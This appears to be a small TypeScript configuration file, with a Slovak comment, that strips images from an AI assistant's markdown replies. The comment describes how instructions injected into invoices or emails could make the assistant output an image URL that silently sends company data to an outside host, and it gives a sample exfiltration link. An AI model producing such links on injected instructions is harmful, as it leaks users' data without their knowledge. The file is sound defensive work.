/*
  Nastavenie ReactMarkdown pre odpovede AI asistenta.

  AI číta aj text, ktorý napísal niekto cudzí (meno dodávateľa z eFaktúry,
  predmet e-mailu, poznámka). Vložený pokyn ju môže prinútiť odpovedať
  obrázkom `![](https://cudzi.sk/?d=<údaje firmy>)` — prehliadač by ho sám
  načítal a údaje odoslal bez jediného kliknutia. Obrázky sa preto nekreslia
  vôbec; odkazy ostávajú (tie vyžadujú klik a react-markdown z nich vyhodí
  `javascript:`).
*/
export const BEZPECNY_MARKDOWN = {
  disallowedElements: ["img"],
  unwrapDisallowed: true,
} as const;
